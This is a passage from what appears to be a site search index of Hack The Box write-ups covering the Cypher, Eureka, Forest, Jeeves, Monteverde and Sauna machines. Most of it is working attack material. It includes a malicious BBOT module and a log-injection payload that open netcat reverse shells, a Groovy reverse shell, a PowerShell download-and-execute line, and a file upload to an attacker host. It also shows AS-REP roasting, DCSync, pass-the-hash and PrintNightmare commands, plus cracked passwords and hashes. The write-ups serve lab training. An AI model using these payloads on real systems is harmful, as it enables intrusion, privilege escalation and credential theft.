a sample module structure that I could leverage for privilege escalation.</p>"},{"location":"htb/cypher/#creating-a-malicious-module","title":"Creating a Malicious Module","text":"<p>I created a file called <code>evilmod.py</code> in the home directory with the following content: <pre><code>from bbot.modules.base import BaseModule\nimport os\nclass evilmod(BaseModule):\n    watched_events = [\"DNS_NAME\"]\n    produced_events = [\"WHOIS\"]\n    flags = [\"passive\", \"safe\"]\n    meta = {\"description\": \"Malicious module for privilege escalation\"}\n    async def setup(self):\n        os.system(\"busybox nc 10.10.16.17 4444 -e sh\")\n    async def handle_event(self, event):\n        pass\n</code></pre></p>"},{"location":"htb/cypher/#modifying-the-preset-file","title":"Modifying the Preset File","text":"<p>I modified the existing preset file to include my custom module directory: <pre><code>targets:\n  - ecorp.htb\noutput_dir: /home/graphasm/bbot_scans\nmodule_dirs:\n  - /home/graphasm\nconfig:\n  modules:\n    evil:\n    neo4j:\n      username: neo4j\n      password: cU4btyib.20xtCMCXkBmerhK\n</code></pre></p>"},{"location":"htb/cypher/#executing-the-exploit","title":"Executing the Exploit","text":"<p>I set up a listener on port 4444 and executed the BBOT binary with my preset: <pre><code>sudo /usr/local/bin/bbot -t http://10.10.16.17/ -p /home/graphasm/bbot_preset.yml -m evilmod\n</code></pre> The malicious module executed during setup, and I received a reverse shell with root privileges.</p>"},{"location":"htb/eureka/","title":"Eureka","text":""},{"location":"htb/eureka/#initial-reconnaissance","title":"Initial Reconnaissance","text":"<p>Starting with an nmap scan to identify open ports and services: <pre><code>PORT     STATE SERVICE REASON         VERSION\n22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\n80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)\n8761/tcp open  http    syn-ack ttl 63 Apache Tomcat (language: en)\n</code></pre> I ran <code>whatweb</code> to gather more information about the webserver: <pre><code>$ whatweb -a 3 10.129.136.130\nhttp://10.129.136.130 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.129.136.130], RedirectLocation[http://furni.htb/], Title[301 Moved Permanently], nginx[1.18.0]\nERROR Opening: http://furni.htb/ - no address for furni.htb\n</code></pre> This showed I needed to add <code>furni.htb</code> to my <code>/etc/hosts</code> file to properly resolve the domain.</p>"},{"location":"htb/eureka/#web-application-analysis","title":"Web Application Analysis","text":"<p>The website contains a login/register form. I tested for injection vulnerabilities and noticed an error when using a very long email: <pre><code>could not execute statement [Data truncation: Data too long for column &amp;#39;last_name&amp;#39; at row 1] [insert into users (email,first_name,is_staff,last_name,password) values (?,?,?,?,?)]; SQL [insert into users (email,first_name,is_staff,last_name,password) values (?,?,?,?,?)]\n</code></pre> This revealed information about the database structure and confirmed it was likely Spring Boot related. I also attempted to add an <code>is_staff=true</code> parameter during registration to gain privileged access, but it didn't work.</p>"},{"location":"htb/eureka/#directory-enumeration","title":"Directory Enumeration","text":"<p>Using dirsearch, I discovered several interesting directories: <pre><code>[03:26:46] 200 -    6KB - /actuator/env\n[03:26:46] 200 -   15B  - /actuator/health\n[03:26:46] 200 -    2B  - /actuator/info\n[03:26:46] 200 -    3KB - /actuator/metrics\n[03:26:46] 405 -  114B  - /actuator/refresh\n[03:26:46] 200 -   54B  - /actuator/scheduledtasks\n[03:26:46] 400 -  108B  - /actuator/sessions\n[03:26:46] 200 -   36KB - /actuator/configprops\n[03:26:46] 200 -   35KB - /actuator/mappings\n[03:26:46] 200 -   99KB - /actuator/loggers\n[03:26:46] 200 -  180KB - /actuator/conditions\n[03:26:46] 200 -  198KB - /actuator/beans\n[03:26:46] 200 -  132KB - /actuator/threaddump\n[03:26:47] 400 -  106B  - /admin/%3bindex/\n[03:26:48] 200 -   76MB - /actuator/heapdump\n</code></pre> This confirmed the backend was running on Spring Boot. The <code>/actuator/heapdump</code> endpoint was particularly interesting as it provides a heap dump from the application's JVM, which could contain sensitive information.</p>"},{"location":"htb/eureka/#finding-credentials-in-heap-dump","title":"Finding Credentials in Heap Dump","text":"<p>I downloaded the heap dump file and began searching for unencrypted passwords: <pre><code>$ strings ~/Downloads/heapdump | grep 'password' -a2 -b2\n</code></pre> This revealed some interesting entries: <pre><code>18842863-com.mysql.cj.exceptions.WrongArgumentException#\n18842911-jdbc:mysql://localhost:3306/Furni_WebApp_DB\n18842955:{password=0sc@r190_S0l!dP@sswd, user=oscar190}!\n18843003-^+P#\n18843008-com.mysql.cj.conf.ConnectionUrl!\n</code></pre> Found JDBC connection credentials: - Username: <code>oscar190</code> - Password: <code>0sc@r190_S0l!dP@sswd</code> Looking for potential HTTP requests: <pre><code>$ strings ~/Downloads/heapdump | grep -E \"^Host:\\s+\\S+$\" -C 10\n</code></pre> This revealed an HTTP request with Basic Auth: <pre><code>X-Frame-Options: DENY\nContent-Length: 0\nDate: Thu, 01 Aug 2024 18:29:30 GMT\nKeep-Alive: timeout=60\nConnection: keep-alive\nPUT /eureka/apps/FURNI/eureka:Furni:8082?status=UP&amp;lastDirtyTimestamp=1722535252684 HTTP/1.1\nAccept: application/json, application*;q=0.8\nAccept-Language: en-US,en;q=0.8\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nCookie: SESSION=NjFhMTAxMDAtM2UxZi00Y2QyLTgwZmMtZDczYWVlNmFhNTAx\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64)\nForwarded: proto=http;host=furni.htb;for=\"127.0.0.1:38464\"\nX-Forwarded-Port: 80\nX-Forwarded-Host: furni.htb\nhost: 10.10.16.17:8081\nusername=miranda.wise%40furni.htb&amp;password=IL%21veT0Be%26BeT0L0ve&amp;_csrf=Eaz1o7Q2S6zhFBhhbWkJWOE_jmx0cSLNf-0UxudV6jAPLFHCI5SUlI1Uep_MciBXXEQ9PoRdow0SFBLgR4h39dVh3gM6Gmf3\n</code></pre> I decoded the HTML-encoded password: - <code>IL%21veT0Be%26BeT0L0ve</code> \u2192 <code>IL!veT0Be&amp;BeT0L0ve</code> I noticed a user directory in the home folder: <pre><code>drwxr-x--- 8 miranda-wise miranda-wise 4096 Mar 21 13:26 miranda-wise\n</code></pre></p>"},{"location":"htb/eureka/#lateral-movement-to-miranda-wise","title":"Lateral Movement to miranda-wise","text":"<p>Using the credentials I captured, I was able to SSH in as <code>miranda-wise</code>.</p>"},{"location":"htb/eureka/#privilege-escalation","title":"Privilege Escalation","text":"<p>After getting access as miranda-wise, I ran linpeas which revealed an interesting file: <pre><code>/opt/log_analyze.sh\n</code></pre> I used pspy64 to see if this script was being run by a privileged user: <pre><code>2025/04/30 13:50:03 CMD: UID=0     PID=127920 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log\n</code></pre> This confirmed the script was being run by the root user. Inspecting the script, I noticed it used <code>grep -oP 'Status: \\K.*'</code> to extract what comes after \"Status:\" in the log file. The critical vulnerability was that the script extracted unsanitized input from the log file and assigned it directly to a variable, indicating a command substitution injection possibility.</p>"},{"location":"htb/eureka/#root-shell-via-command-injection","title":"Root Shell via Command Injection","text":"<p>I crafted an exploit by injecting a command substitution within a log entry that would execute during variable assignment in the <code>analyze_http_statuses</code> function: <pre><code>miranda-wise@eureka:~$ rm -rf /var/www/web/cloud-gateway/log/application.log\nmiranda-wise@eureka:~$ echo 'HTTP Status: x[$(busybox nc 10.10.16.17 3001 -e sh)]' &gt; /var/www/web/cloud-gateway/log/application.log\nmiranda-wise@eureka:~$ /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log\n</code></pre> The <code>x[...]</code> wrapper would execute the reverse shell before failing any comparison in the script. After waiting for the script to be executed by the root cron job, I received a root shell on my netcat listener.</p>"},{"location":"htb/forest/","title":"Forest - Writeup","text":""},{"location":"htb/forest/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"htb/forest/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed standard Active Directory services: <pre><code>PORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Simple DNS Plus\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP\n445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n9389/tcp  open  mc-nmf        .NET Message Framing\n</code></pre></p>"},{"location":"htb/forest/#domain-information","title":"Domain Information","text":"<p>From the scan results, I identified domain information: <pre><code>OS: Windows Server 2016 Standard 14393\nComputer name: FOREST\nNetBIOS computer name: FOREST\nDomain name: htb.local\nForest name: htb.local\nFQDN: FOREST.htb.local\n</code></pre></p>"},{"location":"htb/forest/#smb-enumeration","title":"SMB Enumeration","text":"<p>I attempted to enumerate SMB shares and users: <pre><code>nmap --script=smb-enum-* -p 445 10.129.95.210\n</code></pre></p> <p>This revealed numerous domain users, including: - Administrator - andy - lucinda - mark - santi - sebastien - svc-alfresco</p> <p>I also noticed several service accounts and Exchange-related accounts: - HealthMailbox accounts - Service accounts for Exchange</p>"},{"location":"htb/forest/#rpc-enumeration","title":"RPC Enumeration","text":"<p>I performed RPC enumeration to find additional information: <pre><code>rpcdump.py 10.129.95.210\n</code></pre></p> <p>This provided information about available RPC endpoints and services.</p>"},{"location":"htb/forest/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"htb/forest/#as-rep-roasting","title":"AS-REP Roasting","text":"<p>With the list of users obtained from SMB enumeration, I attempted AS-REP Roasting to identify accounts with Kerberos pre-authentication disabled: <pre><code>GetNPUsers.py htb.local/ -dc-ip 10.129.95.210 -request -usersfile users.txt\n</code></pre></p> <p>This revealed a hash for the \"svc-alfresco\" user: <pre><code>$krb5asrep$23$svc-alfresco@HTB.LOCAL:64cee1c2607306d7d7034e857120fd0b$4e3f2c02330bdf0b4295adf20df3b1076aebc27fe11e8be92a450f3c0d6b94bcafcaece4483811efdc6369ae6d4f903df753cb99abe9dcdb22a2148f37ae987a8aa1ed9d35e40e7335aec91e52c5b4dcd9aac36abbca173956fd3b1d6689f5a89eec53d9ea715bbd650c3be39128b60a518e4d8c6e17836695798304c32e3f1d3185d89a7446dff8f7f314ee9ac4adc1c41ce8ae482de95d87d399ca3912379f3e005401f1f87b4ca93758b29e1a3a814166cf89a07c7721429ab4f813540aa90f2f7e8459915dd239cbf523b68fd242d7527b33a2197b6a3df48e4245b43ddf5a3105515d53\n</code></pre></p>"},{"location":"htb/forest/#password-cracking","title":"Password Cracking","text":"<p>I used Hashcat to crack the obtained hash: <pre><code>hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre></p> <p>This revealed the credentials: - Username: svc-alfresco - Password: s3rvice</p>"},{"location":"htb/forest/#initial-access","title":"Initial Access","text":"<p>I attempted to connect to the target using various methods: <pre><code>wmiexec.py svc-alfresco:s3rvice@10.129.95.210\n</code></pre></p> <p>This failed, but I noticed WinRM (port 5985) was open. I tried using Evil-WinRM: <pre><code>evil-winrm -u svc-alfresco -p 's3rvice' -i 10.129.95.210\n</code></pre></p> <p>This successfully provided a shell as svc-alfresco.</p>"},{"location":"htb/forest/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"htb/forest/#domain-enumeration","title":"Domain Enumeration","text":"<p>After gaining initial access, I loaded PowerView to enumerate the domain: <pre><code>IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.15/PowerView.ps1')\n</code></pre></p> <p>I identified the group memberships of svc-alfresco: <pre><code>Get-NetGroup -UserName svc-alfresco\n</code></pre></p> <p>This showed that svc-alfresco was a member of the \"Service Accounts\" group: <pre><code>GroupDomain             : htb.local\nGroupName               : Service Accounts\nGroupDistinguishedName  : CN=Service Accounts,OU=Security Groups,DC=htb,DC=local\n</code></pre></p> <p>I also enumerated Domain Admins: <pre><code>Get-NetGroupMember -Identity \"Domain Admins\" -Recurse\n</code></pre></p> <p>This showed only the Administrator account was in this group.</p>"},{"location":"htb/forest/#exchange-permissions","title":"Exchange Permissions","text":"<p>Further investigation revealed that the Exchange Windows Permissions group had special permissions in the domain. After research, I found that members of this group can be abused to grant DCSync rights.</p>"},{"location":"htb/forest/#creating-a-rogue-user","title":"Creating a Rogue User","text":"<p>I created a new user to add to the Exchange Windows Permissions group: <pre><code>net user john Dolphin1 /add /domain\nnet group \"Exchange Windows Permissions\" /add john\n</code></pre></p>"},{"location":"htb/forest/#granting-dcsync-rights","title":"Granting DCSync Rights","text":"<p>I used PowerView to grant DCSync rights to the newly created user: <pre><code>$pass = convertto-securestring 'Dolphin1' -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential('htb\\john', $pass)\nAdd-DomainObjectAcl -Credential $cred -TargetIdentity \"DC=htb,DC=local\" -PrincipalIdentity john -Rights DCSync\n</code></pre></p>"},{"location":"htb/forest/#dcsync-attack","title":"DCSync Attack","text":"<p>With DCSync rights, I used secretsdump.py to extract all domain hashes: <pre><code>secretsdump.py -just-dc john:Dolphin1@10.129.95.210 -outputfile dcsync_hashes\n</code></pre></p> <p>This revealed the NTLM hash for the Administrator account: <pre><code>htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::\n</code></pre></p>"},{"location":"htb/forest/#domain-admin-access","title":"Domain Admin Access","text":"<p>Using the Administrator hash, I performed a Pass-The-Hash attack to get administrative access: <pre><code>psexec.py \"Administrator\"@10.129.95.210 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6\n</code></pre></p> <p>This provided a shell as NT AUTHORITY\\SYSTEM on the domain controller</p>"},{"location":"htb/jeeves/","title":"Jeeves - Writeup","text":""},{"location":"htb/jeeves/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"htb/jeeves/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed several open services: <pre><code>PORT      STATE SERVICE       VERSION\n80/tcp    open  http          Microsoft IIS httpd 10.0\n|_http-title: Ask Jeeves\n| http-methods: \n|   Supported Methods: OPTIONS TRACE GET HEAD POST\n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n135/tcp   open  msrpc         Microsoft Windows RPC\n445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)\n50000/tcp open  http          Jetty 9.4.z-SNAPSHOT\n|_http-title: Error 404 Not Found\n|_http-server-header: Jetty(9.4.z-SNAPSHOT)\n</code></pre></p> <p>Based on the scan results, I identified: - Microsoft IIS web server running on port 80 - SMB services on port 445  - A Jetty web server running on port 50000 - Hostname: JEEVES - Operating System: Windows (likely Windows Server 2008 R2 or Windows 8.1)</p>"},{"location":"htb/jeeves/#web-enumeration","title":"Web Enumeration","text":"<p>Looking at the web server on port 80, I found a basic \"Ask Jeeves\" themed search page that didn't reveal much functionality.</p> <p>For the Jetty server on port 50000, I ran directory enumeration: <pre><code>gobuster dir -u http://10.129.228.8:50000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n</code></pre></p> <p>This revealed an interesting directory: <pre><code>/askjeeves            (Status: 302) [Size: 0] [--&gt; http://10.129.228.8:50000/askjeeves/]\n</code></pre></p>"},{"location":"htb/jeeves/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"htb/jeeves/#jenkins-discovery","title":"Jenkins Discovery","text":"<p>Following the <code>/askjeeves</code> redirection, I discovered a Jenkins automation server. Jenkins is a popular open-source automation server that is often misconfigured and can be leveraged for remote code execution.</p> <p>Jenkins provides a script console feature that allows running Groovy scripts directly on the server. This is a powerful feature that, if accessible, can lead to remote code execution.</p> <p>I navigated to the script console: <pre><code>http://10.129.228.8:50000/askjeeves/script\n</code></pre></p> <p>From there, I was able to execute arbitrary Groovy code, which I leveraged for a reverse shell.</p>"},{"location":"htb/jeeves/#obtaining-a-reverse-shell","title":"Obtaining a Reverse Shell","text":"<p>I set up a netcat listener on my attack machine: <pre><code>nc -lvnp 4444\n</code></pre></p> <p>Then I used the following Groovy script in the Jenkins script console to establish a reverse shell: <pre><code>String host=\"10.10.16.3\";\nint port=4444;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();\nSocket s=new Socket(host,port);\nInputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();\nOutputStream po=p.getOutputStream(),so=s.getOutputStream();\nwhile(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre></p> <p>After executing the script, I received a reverse shell connection to my netcat listener, providing me initial access to the system.</p>"},{"location":"htb/jeeves/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"htb/jeeves/#credential-hunting","title":"Credential Hunting","text":"<p>After gaining access to the system, I began searching for potential privilege escalation vectors. In the Documents folder, I discovered a KeePass password database file: <pre><code>C:\\Users\\kohsuke\\Documents\\CEH.kdbx\n</code></pre></p> <p>I transferred this file to my attack machine using a simple Python HTTP server: <pre><code># On the target\npowershell -c \"(New-Object System.Net.WebClient).UploadFile('http://10.10.16.3:8000/upload.php', 'C:\\Users\\kohsuke\\Documents\\CEH.kdbx')\"\n\n# On my attack machine\npython3 -m http.server 8000\n</code></pre></p>"},{"location":"htb/jeeves/#keepass-password-cracking","title":"KeePass Password Cracking","text":"<p>Once I had the KeePass database file, I needed to crack the master password: <pre><code>keepass2john '/home/kali/Documents/PEN200/HTB/Jeeves/CEH.kdbx' &gt; hash\njohn hash -w:'/usr/share/wordlists/rockyou.txt'\n</code></pre></p> <p>This revealed the master password: <code>moonshine1</code></p>"},{"location":"htb/jeeves/#credential-analysis","title":"Credential Analysis","text":"<p>Opening the KeePass database with the cracked password revealed stored credentials: - Admin account password: <code>S1TjAtJHKsugh9oC4VZl</code> - Hash for a backup account: <code>aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00</code></p>"},{"location":"htb/jeeves/#gaining-administrative-access","title":"Gaining Administrative Access","text":"<p>I first attempted to use the admin password directly with PsExec: <pre><code>psexec.py Administrator@10.129.228.8 -p 'S1TjAtJHKsugh9oC4VZl'\n</code></pre></p> <p>This resulted in a login error. </p> <p>I then tried using the hash (pass-the-hash technique) with PsExec: <pre><code>psexec.py Administrator@10.129.228.8 -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00\n</code></pre></p> <p>This was successful and provided me with a SYSTEM-level shell.</p>"},{"location":"htb/jeeves/#flag-extraction","title":"Flag Extraction","text":"<p>Once logged in as Administrator, I navigated to the usual location for the root flag but encountered an unusual situation. The flag wasn't immediately visible in the Administrator's desktop.</p> <p>After some exploration, I discovered that the flag was hidden in an Alternate Data Stream (ADS). Windows NTFS file systems support ADS, which allows files to contain more than one stream of data.</p> <p>To list files with ADS, I used: <pre><code>dir /r /a\n</code></pre></p> <p>This revealed an alternate data stream named <code>root.txt</code> within a file called <code>hm.txt</code>.</p> <p>To read the contents of this alternate data stream, I used: <pre><code>more &lt; hm.txt:root.txt\n</code></pre></p> <p>This successfully displayed the root flag</p>"},{"location":"htb/monteverde/","title":"Monteverde - Writeup","text":""},{"location":"htb/monteverde/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"htb/monteverde/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed standard Active Directory services: <pre><code>PORT      STATE SERVICE       VERSION\n53/tcp    open  domain        Microsoft DNS\n88/tcp    open  kerberos-sec  Microsoft Windows Kerberos\n135/tcp   open  msrpc         Microsoft Windows RPC\n139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp   open  ldap          Microsoft Windows Active Directory LDAP\n445/tcp   open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds\n464/tcp   open  kpasswd5?\n593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped\n3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP\n3269/tcp  open  tcpwrapped\n5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n</code></pre></p>"},{"location":"htb/monteverde/#domain-information","title":"Domain Information","text":"<p>Using enum4linux, I gathered information about the domain: <pre><code>Domain Name: MEGABANK\nDomain SID: S-1-5-21-391775091-850290835-3566037492\n</code></pre></p>"},{"location":"htb/monteverde/#user-enumeration","title":"User Enumeration","text":"<p>The enum4linux output revealed several domain users: <pre><code>user:[Guest] rid:[0x1f5]\nuser:[AAD_987d7f2f57d2] rid:[0x450]\nuser:[mhope] rid:[0x641]\nuser:[SABatchJobs] rid:[0xa2a]\nuser:[svc-ata] rid:[0xa2b]\nuser:[svc-bexec] rid:[0xa2c]\nuser:[svc-netapp] rid:[0xa2d]\nuser:[dgalanos] rid:[0xa35]\nuser:[roleary] rid:[0xa36]\nuser:[smorgan] rid:[0xa37]\n</code></pre></p> <p>I also noted interesting group memberships: <pre><code>Group: 'HelpDesk' (RID: 2611) has member: MEGABANK\\roleary\nGroup: 'Operations' (RID: 2609) has member: MEGABANK\\smorgan\nGroup: 'Trading' (RID: 2610) has member: MEGABANK\\dgalanos\nGroup: 'Azure Admins' (RID: 2601) has member: MEGABANK\\Administrator\nGroup: 'Azure Admins' (RID: 2601) has member: MEGABANK\\AAD_987d7f2f57d2\nGroup: 'Azure Admins' (RID: 2601) has member: MEGABANK\\mhope\n</code></pre></p> <p>The Azure Admins group was particularly interesting as a potential privilege escalation path.</p>"},{"location":"htb/monteverde/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"htb/monteverde/#password-spraying","title":"Password Spraying","text":"<p>I created a list of usernames from the enum4linux output: <pre><code>echo \"Guest\nAAD_987d7f2f57d2\nmhope\nSABatchJobs\nsvc-ata\nsvc-bexec\nsvc-netapp\ndgalanos\nroleary\nsmorgan\" &gt; users.txt\n</code></pre></p> <p>First, I attempted to identify users vulnerable to AS-REP Roasting, but this was unsuccessful: <pre><code>GetNPUsers.py megabank.local/ -usersfile users.txt -no-pass -dc-ip 10.129.228.111\n</code></pre></p> <p>I then tried a password spraying attack, using each username as a potential password: <pre><code>crackmapexec smb 10.129.228.111 -u users.txt -p users.txt --no-bruteforce\n</code></pre></p> <p>This revealed valid credentials: - Username: SABatchJobs - Password: SABatchJobs</p>"},{"location":"htb/monteverde/#smb-enumeration","title":"SMB Enumeration","text":"<p>With the discovered credentials, I connected to the SMB service: <pre><code>smbclient.py megabank.local/SABatchJobs:SABatchJobs@10.129.228.111\n</code></pre></p> <p>I discovered several shares and explored them: <pre><code>smbclient //10.129.228.111/users$ -U megabank.local/SABatchJobs\n</code></pre></p> <p>Using the <code>tree</code> command to recursively list directories, I found an interesting file: <pre><code>\\users\\mhope\\azure.xml\n</code></pre></p> <p>I downloaded and examined this file: <pre><code>get mhope/azure.xml\ncat azure.xml\n</code></pre></p> <p>This file contained credentials for the user mhope: <pre><code>&lt;Objs Version=\"1.1.0.1\" xmlns=\"http://schemas.microsoft.com/powershell/2004/04\"&gt;\n  &lt;Obj RefId=\"0\"&gt;\n    &lt;TN RefId=\"0\"&gt;\n      &lt;T&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/T&gt;\n      &lt;T&gt;System.Object&lt;/T&gt;\n    &lt;/TN&gt;\n    &lt;ToString&gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&lt;/ToString&gt;\n    &lt;Props&gt;\n      &lt;S N=\"Password\"&gt;4n0therD4y@n0th3r&lt;/S&gt;\n    &lt;/Props&gt;\n  &lt;/Obj&gt;\n&lt;/Objs&gt;\n</code></pre></p>"},{"location":"htb/monteverde/#lateral-movement","title":"Lateral Movement","text":""},{"location":"htb/monteverde/#accessing-mhope-account","title":"Accessing mhope Account","text":"<p>Using the discovered password, I attempted to authenticate as mhope: <pre><code>evil-winrm -i 10.129.228.111 -u mhope -p '4n0therD4y@n0th3r'\n</code></pre></p> <p>This provided access as the mhope user, who was a member of the Azure Admins group.</p>"},{"location":"htb/monteverde/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"htb/monteverde/#exploiting-printnightmare","title":"Exploiting PrintNightmare","text":"<p>After researching privilege escalation vectors for Azure Admins, I identified that the target was vulnerable to PrintNightmare (CVE-2021-1675).</p> <p>I uploaded the PrintNightmare exploit to the target: <pre><code>upload CVE-2021-1675.ps1\n</code></pre></p> <p>Then executed the exploit to create a new administrative user: <pre><code>Import-Module ./CVE-2021-1675.ps1\nInvoke-Nightmare -NewUser \"hacker\" -NewPassword \"Dolphin1\"\n</code></pre></p>"},{"location":"htb/monteverde/#gaining-administrative-access","title":"Gaining Administrative Access","text":"<p>With the newly created administrative user, I established a new WinRM session: <pre><code>evil-winrm -i 10.129.228.111 -u hacker -p 'Dolphin1'\n</code></pre></p> <p>This provided me with administrative access to the domain controller, successfully completing the challenge.</p> <p>A quick check confirmed my administrative privileges: <pre><code>whoami /all\n</code></pre></p> <p>The output showed that my new user was a member of the local Administrators group.</p>"},{"location":"htb/sauna/","title":"Sauna - Writeup","text":""},{"location":"htb/sauna/#initial-enumeration","title":"Initial Enumeration","text":""},{"location":"htb/sauna/#port-scanning","title":"Port Scanning","text":"<p>A comprehensive port scan revealed standard Active Directory services: <pre><code>PORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP\n3269/tcp open  tcpwrapped\n</code></pre></p>"},{"location":"htb/sauna/#domain-information","title":"Domain Information","text":"<p>From the scan results, I identified domain information: <pre><code>NetBIOS computer name: SAUNA\nNetBIOS domain name: EGOTISTICALBANK\nDNS domain: EGOTISTICAL-BANK.LOCAL\nFQDN: SAUNA.EGOTISTICAL-BANK.LOCAL\n</code></pre></p>"},{"location":"htb/sauna/#web-enumeration","title":"Web Enumeration","text":"<p>I examined the website running on port 80 and found an \"About Us\" page with employee information. This could be valuable for username enumeration: <pre><code>curl -s http://10.129.95.180/about.html | grep -i \"team\"\n</code></pre></p> <p>I used cewl to generate a wordlist from the website content: <pre><code>cewl http://10.129.95.180/ -w website_words.txt\n</code></pre></p>"},{"location":"htb/sauna/#gaining-initial-access","title":"Gaining Initial Access","text":""},{"location":"htb/sauna/#as-rep-roasting","title":"AS-REP Roasting","text":"<p>First, I attempted AS-REP Roasting using potential usernames generated from the website: <pre><code>GetNPUsers.py egotistical-bank.local/ -usersfile users.txt -request\n</code></pre></p> <p>This initially returned no results, so I created a more targeted list based on employee names found on the \"About Us\" page, following common username formats: <pre><code>fsmith\nhsmith\nscoins\nferguss\nfergs\nfsmit\nhsmit\n</code></pre></p> <p>Running the AS-REP Roasting attack again, I successfully obtained a hash for user fsmith: <pre><code>GetNPUsers.py egotistical-bank.local/ -usersfile employee_names.txt -request\n</code></pre></p> <p>This yielded a Kerberos AS-REP hash: <pre><code>$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:1e39a1ecae838d452543f116f6f67fb0$241a512a4b745a997f5ec28957ec15ddd05f7d18f942ec3d522a35fb4e34c5752e0a2f13f6dd88ef5d0d231347f999a443209725b47f1985a3e48aabfde7458cac7cf16d9e89277abdcffd22496076ad228b68caba67a872ad4d460c4ecfa90d02f4ba8175f5f2fec4893216b80f23830723a474577b864c6bb3f8993cc0ddb2187c5e1459712ae1b5e3ff636d00cc7e5c0f164672277447c14dd6f6149c28e9ae04ce12316173f44f16fde22dc903ac6dc9260c1dab25b3362b02388080fb2b528cd83fcd9052c0fea0047687cc6dc0d0fdc42e581c2a1609d513a38d589cf8e1aeba3a1fb222e09bd09d2bf904778dbaba0a1c8dca28eaeadc8d21e9e5ae8a\n</code></pre></p>"},{"location":"htb/sauna/#password-cracking","title":"Password Cracking","text":"<p>I saved the hash to a file and used hashcat to crack it: <pre><code>hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt\n</code></pre></p> <p>This revealed the password: - Username: fsmith - Password: Thestrokes23</p>"},{"location":"htb/sauna/#post-authentication-enumeration","title":"Post-Authentication Enumeration","text":"<p>With valid credentials, I enumerated available SMB shares: <pre><code>smbclient -L //10.129.95.180/ -U egotistical-bank.local/fsmith\n</code></pre></p> <p>This revealed several shares: <pre><code>ADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nIPC$            IPC       Remote IPC\nNETLOGON        Disk      Logon server share \nprint$          Disk      Printer Drivers\nRICOH Aficio SP 8300DN PCL 6   Printer   We cant print money\nSYSVOL          Disk      Logon server share\n</code></pre></p> <p>The presence of a printer share was particularly interesting, suggesting a potential PrintNightmare vulnerability.</p>"},{"location":"htb/sauna/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"htb/sauna/#exploiting-printnightmare","title":"Exploiting PrintNightmare","text":"<p>After confirming that the target was vulnerable to PrintNightmare 